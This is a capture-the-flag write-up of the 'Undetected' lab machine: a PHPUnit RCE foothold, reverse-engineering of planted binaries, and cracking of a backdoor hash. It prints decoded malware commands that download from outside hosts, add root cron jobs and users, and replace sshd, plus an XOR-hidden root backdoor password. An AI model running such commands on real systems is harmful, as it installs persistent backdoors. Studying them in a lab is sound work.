# Undetected

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.136.44
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-08 12:00 EDT
Nmap scan report for 10.129.136.44
Host is up (0.010s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### DJewelry -> PHPUnit RCE

The website is a company page:

<figure><img src="../../../.gitbook/assets/image (630).png" alt=""><figcaption></figcaption></figure>

If we try to Visit Store, we get redirected to `store.djewelry.htb`. The store page is identical to the original, but it has more functionalities:

<figure><img src="../../../.gitbook/assets/image (1927).png" alt=""><figcaption></figcaption></figure>

I tried adding products to the cart and maybe finding an exploit pertaining to that, but it was disabled.

<figure><img src="../../../.gitbook/assets/image (2444).png" alt=""><figcaption></figcaption></figure>

Since there's no functionalities on this site, let's run a `feroxbuster` directory scan.

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://store.djewelry.htb -x php -t 100 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://store.djewelry.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/05/08 12:18:37 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 283]
/index.php            (Status: 200) [Size: 6215]
/images               (Status: 301) [Size: 325] [-> http://store.djewelry.htb/images/]
/login.php            (Status: 200) [Size: 4129]
/products.php         (Status: 200) [Size: 7447]
/cart.php             (Status: 200) [Size: 4396]
/css                  (Status: 301) [Size: 322] [-> http://store.djewelry.htb/css/]
/js                   (Status: 301) [Size: 321] [-> http://store.djewelry.htb/js/]
/vendor               (Status: 301) [Size: 325] [-> http://store.djewelry.htb/vendor/]
/fonts                (Status: 301) [Size: 324] [-> http://store.djewelry.htb/fonts/]
```

When we view the `/vendor` endpoint, we see a file system with different PHP libraries:

<figure><img src="../../../.gitbook/assets/image (3572).png" alt=""><figcaption></figcaption></figure>

Searching for exploits for each of them leads me an RCE for PHPUnit:

{% embed url="https://www.exploit-db.com/exploits/50702" %}

This works:

<figure><img src="../../../.gitbook/assets/image (2716).png" alt=""><figcaption></figcaption></figure>

Then, use a `bash` one-liner to get a reverse shell.

<figure><img src="../../../.gitbook/assets/image (3242).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Info RE

We can't access the user flag yet, and `steven` is the user of this machine. Within the `/var/backups` folder, there's a file that is not meant to be there:

```
www-data@production:/var/backups$ ls -la
total 72
drwxr-xr-x  2 root     root      4096 May  8 15:07 .
drwxr-xr-x 13 root     root      4096 Feb  8  2022 ..
-rw-r--r--  1 root     root     34011 Feb  8  2022 apt.extended_states.0
-r-x------  1 www-data www-data 27296 May 14  2021 info
```

This file was an ELF binary:

{% code overflow="wrap" %}
```
www-data@production:/var/backups$ file info
info: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0dc004db7476356e9ed477835e583c68f1d2493a, for GNU/Linux 3.2.0, not stripped
```
{% endcode %}

We can transfer this back to my machine for some reverse engineering via `ghidra`. There were loads of functions within the binary.

There are a lot of functions within this function:

<figure><img src="../../../.gitbook/assets/image (3774).png" alt=""><figcaption></figcaption></figure>

Out of all the functions, `exec_shell` is the most unique because it actually executes something.

<figure><img src="../../../.gitbook/assets/image (1565).png" alt=""><figcaption></figcaption></figure>

We can see the `-c` flag, and it is passed to `execve`, which means that some commands are being executed here. However, `ghidra` is unable to to see what is being executed. When we open it up in `ida64`, we can see a huge chunk of hex.

<figure><img src="../../../.gitbook/assets/image (1281).png" alt=""><figcaption></figcaption></figure>

When converted to a string, it gives this:

{% code overflow="wrap" %}
```
wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo "* 3 * * * root /var/lib/.main" >> /etc/crontab; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd; while read -r user group home shell _; do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; done < users.txt; rm users.txt;
```
{% endcode %}

We can tidy this up a bit:

```bash
wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys
wget tempfiles.xyz/.main -O /var/lib/.main
chmod 755 /var/lib/.main
echo "* 3 * * * root /var/lib/.main" >> /etc/crontab
awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd
awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd
while read -r user group home shell _
do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd
done < users.txt
rm users.txt
```

There's a hash within this, which is crackable after removing all of the `\$` characters and the rest of the random parts.

```
$ cat hash
$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ihatehackers     (?)     
1g 0:00:00:26 DONE (2023-05-09 10:28) 0.03838g/s 3419p/s 3419c/s 3419C/s janedoe..halo03
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Reading the code, it seems to make the user `$user"1"`, which means it is `steven1` in this case. We can then `ssh` in as `steven1` using this password:

<figure><img src="../../../.gitbook/assets/image (1437).png" alt=""><figcaption></figcaption></figure>

### Mod\_Reader.o RE

Running LinPEAS reveals there is mail for the user:

<figure><img src="../../../.gitbook/assets/image (3810).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
steven@production:~$ cat /var/mail/steven
From root@production  Sun, 25 Jul 2021 10:31:12 GMT
Return-Path: <root@production>
Received: from production (localhost [127.0.0.1])
        by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847
        for <steven@production>; Sun, 25 Jul 2021 10:31:12 GMT
Received: (from root@localhost)
        by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;
        Sun, 25 Jul 2021 10:31:12 GMT
Date: Sun, 25 Jul 2021 10:31:12 GMT
Message-Id: <202107251031.80FAcdZ171847@production>
To: steven@production
From: root@production
Subject: Investigations

Hi Steven.

We recently updated the system but are still experiencing some strange behaviour with the Apache service.
We have temporarily moved the web store and database to another server whilst investigations are underway.
If for any reason you need access to the database or web application code, get in touch with Mark and he
will generate a temporary password for you to authenticate to the temporary server.

Thanks,
sysadmin
```
{% endcode %}

Apache service is weird and there's a database basically. We can head to `/etc/apache2` to enumerate more. I was looking through the files and found a particualrly large file in `mods-available` that had the latest edit date:

```
steven@production:/etc/apache2/mods-available$ ls -lat
total 636
drwxr-xr-x 2 root root 12288 Feb  8  2022 .
drwxr-xr-x 8 root root  4096 Feb  8  2022 ..
-rw-r--r-- 1 root root 37616 Jul  5  2021 mod_reader.o
-rw-r--r-- 1 root root   565 Jul  5  2021 mpm_prefork.conf
<TRUNCATED>
```

The rest of the files were about 500 bytes, meanwhile this thing was massive. We can bring this back to our machine for analysis via `nc`.&#x20;

Then, using `ida64`, we see that there are base64 related functions for this:

<figure><img src="../../../.gitbook/assets/image (448).png" alt=""><figcaption></figcaption></figure>

We can locate the string and see that it is being passed into another `bash -c` command:

<figure><img src="../../../.gitbook/assets/image (1729).png" alt=""><figcaption></figcaption></figure>

When decoded, it shows this:

{% code overflow="wrap" %}
```bash
wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd
```
{% endcode %}

`sshd` is in use here, so let's download that binary back to our machine since RE seems to be the path forward in this machine.&#x20;

### sshd RE -> Root Pwd

This was a much larger binary, so let's use `ghidra` to get some pseudocode. When looking through the functions, we can see that the `auth_password` function is a backdoor.

<figure><img src="../../../.gitbook/assets/image (3115).png" alt=""><figcaption></figcaption></figure>

This might contain the credentials for `root`.&#x20;

```c
int auth_password(ssh *ssh,char *password)

{
  Authctxt *ctxt;
  passwd *ppVar1;
  int iVar2;
  uint uVar3;
  byte *pbVar4;
  byte *pbVar5;
  size_t sVar6;
  byte bVar7;
  int iVar8;
  long in_FS_OFFSET;
  char backdoor [31];
  byte local_39 [9];
  long local_30;
  
  bVar7 = 0xd6;
  ctxt = (Authctxt *)ssh->authctxt;
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  backdoor._28_2_ = 0xa9f4;
  ppVar1 = ctxt->pw;
  iVar8 = ctxt->valid;
  backdoor._24_4_ = 0xbcf0b5e3;
  backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
  backdoor[30] = -0x5b;
  backdoor._0_4_ = 0xf0e7abd6;
  backdoor._4_4_ = 0xa4b3a3f3;
  backdoor._8_4_ = 0xf7bbfdc8;
  backdoor._12_4_ = 0xfdb3d6e7;
  pbVar4 = (byte *)backdoor;
  while( true ) {
    pbVar5 = pbVar4 + 1;
    *pbVar4 = bVar7 ^ 0x96;
    if (pbVar5 == local_39) break;
    bVar7 = *pbVar5;
    pbVar4 = pbVar5;
  }
  iVar2 = strcmp(password,backdoor);
<TRUNCATED>
```

This takes some bytes and jumbles them up, then it would XOR with `0x96` before comparing with some variable and stop the function. The "some variable" probably refers to an index variable for a `for` loop that iterates over the entire string.&#x20;

From running `lscpu` on the machine, we know this is a little endian machine, and we need to reverse this string.  There are 31 bytes (indicated by `backdoor[30]` being the largest index I can see here) and they are all over the place. Let's first organise the string in order:

<pre><code>backdoor._0_4_ = 0xf0e7abd6;
backdoor._4_4_ = 0xa4b3a3f3;
backdoor._8_4_ = 0xf7bbfdc8;
backdoor._12_4_ = 0xfdb3d6e7;
backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
backdoor._24_4_ = 0xbcf0b5e3;
backdoor._28_2_ = 0xa9f4;
backdoor[30] = -0x5b = 0xa5 (using two's complement)
<strong>a5a9f4bcf0b5e3b2d6f4a0fda0b3d6fdb3d6e7f7bbfdc8a4b3a3f3f0e7abd6
</strong></code></pre>

Afterwards, we just need to convert this to a string, XOR it with `0x96`, then reverse it back. The last step is needed because after the XOR operation, the first byte becomes the last.

{% embed url="https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'96'%7D,'Standard',false)Reverse('Character')&input=YTVhOWY0YmNmMGI1ZTNiMmQ2ZjRhMGZkYTBiM2Q2ZmRiM2Q2ZTdmN2JiZmRjOGE0YjNhM2YzZjBlN2FiZDY" %}

This would give us the string `@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3`, which is the `root` password:

<figure><img src="../../../.gitbook/assets/image (2001).png" alt=""><figcaption></figcaption></figure>
